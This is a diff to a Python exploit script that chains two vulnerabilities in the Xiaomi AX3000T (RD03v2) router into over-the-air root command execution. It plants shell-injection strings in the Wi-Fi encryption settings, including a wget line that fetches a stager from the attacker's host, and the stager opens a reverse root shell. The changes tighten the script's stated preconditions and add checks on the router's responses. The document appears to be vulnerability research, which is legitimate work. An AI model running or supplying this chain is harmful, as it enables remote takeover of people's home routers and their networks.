@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
-"""Over-the-air pre-auth root RCE on Xiaomi AX3000T (RD03v2) stock 2.0.28.
+"""Over-the-air root RCE in a gate-open RD03v2 stock 2.0.28 state.
 
 Combines Chain 1 (admin takeover via cab_meshd) and Chain 2 (root command
 execution via mgmt_2g/mgmt_5g encryption injection) into a single attack
-that yields an interactive root reverse shell -- purely over Wi-Fi, with no
-credentials, no WAN cable, and no user interaction.
+that yields an interactive root reverse shell -- from a client already on
+Wi-Fi, without router-admin or mesh credentials, a WAN cable, or user
+interaction during the chain.
 
 The attack has three phases:
 
@@ -37,14 +38,16 @@ The stager script (served over HTTP) sends a proof-of-concept callback,
 self-repairs the Wi-Fi encryption so the AP survives cap_init's reconfig,
 and starts a reconnecting reverse shell back to the attacker.
 
-Confirmed end-to-end on physical hardware:
+Confirmed end-to-end on physical hardware after minimal initialization left
+NETMODE unset:
   - Root callback: GET /pwned?uid=0_user=root_host=XiaoQiang
   - Interactive root shell: BusyBox ash, uid=0(root), Linux XiaoQiang 4.4.60
 
 Prerequisites:
-  - Wi-Fi (or LAN) adjacency to an initialised RD03v2 (INITTED=YES).
-  - TCP 19553 reachable (the normal state of a deployed router).
-  - Nothing else. No credentials, no user interaction, no prior foothold.
+  - Wi-Fi (or LAN) adjacency to an initialized RD03v2 (INITTED=YES).
+  - TCP 19553 reachable and get_netmode returning numeric 0. The normal web
+    wizard can set whc_cap (4), which blocks this CAP root path.
+  - No router-admin or mesh credentials, no prior foothold.
 
 Usage:
     python3 ota_rce.py --host 192.168.31.1
@@ -248,6 +251,22 @@ def api(host, stok, path, params=None):
     return urllib.request.urlopen(url, data=data, timeout=45).read().decode()
 
 
+def require_tested_gate_open_mode(raw):
+    """Fail closed unless stock reports the gate-open mode tested on hardware."""
+    response = json.loads(raw)
+    if not isinstance(response, dict) or response.get("code") != 0:
+        raise ValueError("get_netmode did not return code=0")
+    mode = response.get("netmode")
+    if type(mode) is not int:
+        raise ValueError("get_netmode did not return a numeric mode")
+    if mode != 0:
+        raise ValueError(
+            f"NETMODE={mode} is not the gate-open mode verified on hardware; "
+            "normal web setup can set whc_cap (4)"
+        )
+    return mode
+
+
 # ---- Phase B: injection plant ----
 
 
@@ -256,9 +275,12 @@ def plant_payloads(host, stok, attacker_ip, serve_port):
     Returns the 2.4G SSID (needed for the reconnect instructions)."""
     # read current SSIDs to preserve them
     info = json.loads(api(host, stok, "api/xqnetwork/wifi_detail_all"))
-    ssids = [w.get("ssid", "MiWiFi") for w in info.get("info", [])]
-    ssid24 = ssids[0] if len(ssids) > 0 else "MiWiFi"
-    ssid5 = ssids[1] if len(ssids) > 1 else ssid24
+    bands = info.get("info") if isinstance(info, dict) and info.get("code") == 0 else None
+    if not isinstance(bands, list) or len(bands) < 2 or not all(
+        isinstance(w, dict) and w.get("ssid") for w in bands[:2]
+    ):
+        raise RuntimeError("wifi_detail_all did not return both expected radios")
+    ssid24, ssid5 = bands[0]["ssid"], bands[1]["ssid"]
     log(f"[B] current SSIDs: 2.4G={ssid24!r}  5G={ssid5!r} (preserved)")
 
     p_fetch = f'\\" wget http://{attacker_ip}:{serve_port}/s -O /tmp/x #'
@@ -268,21 +290,31 @@ def plant_payloads(host, stok, attacker_ip, serve_port):
         "wifiIndex": "1", "ssid": ssid24,
         "pwd": "meshpoc12345", "encryption": p_fetch,
     })
-    log(f"[B] 2.4G encryption planted -> {json.loads(r1)}")
+    res1 = json.loads(r1)
+    if not isinstance(res1, dict) or res1.get("code") != 0:
+        raise RuntimeError(f"2.4G plant rejected: {res1}")
+    log("[B] 2.4G plant accepted")
 
     r2 = api(host, stok, "api/xqnetwork/set_wifi_without_restart", {
         "wifiIndex": "2", "ssid": ssid5,
         "pwd": "meshpoc12345", "encryption": p_exec,
     })
-    log(f"[B] 5G encryption planted   -> {json.loads(r2)}")
+    res2 = json.loads(r2)
+    if not isinstance(res2, dict) or res2.get("code") != 0:
+        raise RuntimeError(f"5G plant rejected: {res2}")
+    log("[B] 5G plant accepted")
 
-    # verify the payloads landed
+    # wifi_detail_all uses the same 1=2.4G, 2=5G order as wifiIndex above.
+    # Verify both distinct values exactly before a trigger that can close the gate.
     info2 = json.loads(api(host, stok, "api/xqnetwork/wifi_detail_all"))
-    for w in info2.get("info", []):
-        enc = w.get("encryption", "")
-        log(f"[B] read-back: encryption={enc!r}")
-        if "wget" not in enc and "sh /tmp" not in enc:
-            log("[!] WARNING: payload not reflected in read-back")
+    stored = info2.get("info") if isinstance(info2, dict) and info2.get("code") == 0 else None
+    if not isinstance(stored, list) or len(stored) < 2 or not all(
+        isinstance(w, dict) for w in stored[:2]
+    ):
+        raise RuntimeError("wifi_detail_all read-back did not return both radios")
+    if stored[0].get("encryption") != p_fetch or stored[1].get("encryption") != p_exec:
+        raise RuntimeError("2.4G fetch or 5G exec payload did not survive read-back")
+    log("[B] both payloads read back exactly on the intended radios")
     return ssid24
 
 
@@ -419,15 +451,16 @@ def start_http_server(stager_content, port):
 
 def main():
     ap = argparse.ArgumentParser(
-        description="Over-the-air pre-auth root RCE on Xiaomi AX3000T (RD03v2).",
+        description="Over-the-air root RCE on a gate-open Xiaomi AX3000T (RD03v2).",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=textwrap.dedent("""\
             Combines Chain 1 (admin hash leak via cab_meshd) and Chain 2 (root
             eval via encryption injection) into a single over-the-air attack
             that yields an interactive root reverse shell.
 
-            The attack is Wi-Fi-only, requires no credentials, and the device
-            stays online throughout (self-repairing payload).
+            The tested attack is over Wi-Fi, requires no router-admin or mesh
+            credentials, and needs NETMODE=0. The device stays online through
+            the demonstrated run (self-repairing payload).
 
             Example:
               Terminal 1:  python3 ota_rce.py --host 192.168.31.1
@@ -481,35 +514,33 @@ def main():
     stok = mint_admin(args.host, h256, mac)
     log(f"[A] admin session minted: stok={stok}")
 
-    # The trigger is ONE-SHOT, so establish that the unit is armed *before* touching
-    # anything. The first cap_init persists NETMODE=whc_cap, and do_cap_init then
-    # skips its entire payload block -- including the mimesh_init eval -- while
-    # NETMODE is already whc_cap. Firing a spent unit therefore looks exactly like a
-    # broken exploit: the plant succeeds, the trigger is accepted, and nothing ever
-    # calls back. Say which of the two it is, rather than planting a payload that
-    # cannot run.
+    # Confirm the gate-open mode used in the physical test before writing any
+    # Wi-Fi setting. Normal stock web setup can set whc_cap, where do_cap_init
+    # skips the eval; a prior completed cap_init can produce the same value.
+    # Unknown/error replies must never be treated as "armed".
     try:
-        netmode = json.loads(api(args.host, stok, "api/xqnetwork/get_netmode")).get("netmode")
+        netmode = require_tested_gate_open_mode(
+            api(args.host, stok, "api/xqnetwork/get_netmode")
+        )
     except Exception as e:                                       # noqa: BLE001
-        netmode = None
-        log(f"[!] could not read NETMODE ({e}) -- armed check skipped")
-
-    if netmode == 4:
-        log("")
-        log("[-] UNIT IS DISARMED: NETMODE=whc_cap")
-        log("[-] A previous cap_init consumed the one-shot, and the injection sink")
-        log("[-] stays gated until the device is factory reset. Nothing was planted")
-        log("[-] and nothing was fired. Factory-reset the unit to re-arm, then re-run.")
+        log(f"[-] CAP root path not confirmed open: {e}")
+        log("[-] Nothing was planted or triggered. See CORRECTIONS.md for the")
+        log("[-] difference between normal web setup and minimal initialization.")
         return 1
-    if netmode is not None:
-        log(f"[*] NETMODE={netmode} (armed)")
+    log(f"[*] NETMODE={netmode} (tested gate-open state)")
 
     # Phase B
     log("")
     log("=" * 60)
     log("  Phase B: injection plant")
     log("=" * 60)
-    ssid24 = plant_payloads(args.host, stok, attacker, args.serve_port)
+    try:
+        ssid24 = plant_payloads(args.host, stok, attacker, args.serve_port)
+    except Exception as e:                                       # noqa: BLE001
+        log(f"[-] payload plant/read-back failed: {e}")
+        log("[-] No trigger fired. Some Wi-Fi UCI values may have changed;")
+        log("[-] inspect and restore them before rebooting the router.")
+        return 1
     log("[B] payloads planted in UCI (Wi-Fi unchanged)")
 
     if args.no_trigger:
@@ -545,8 +576,7 @@ def main():
             "the stager still runs on the device)")
 
     log("")
-    log(f"[*] one-shot: cap_init has set NETMODE=whc_cap; "
-        f"factory-reset to re-arm")
+    log("[*] cap_init may change NETMODE; check the current state before any rerun")
     log("")
     log("=" * 60)
     log("  Waiting for Wi-Fi self-repair")
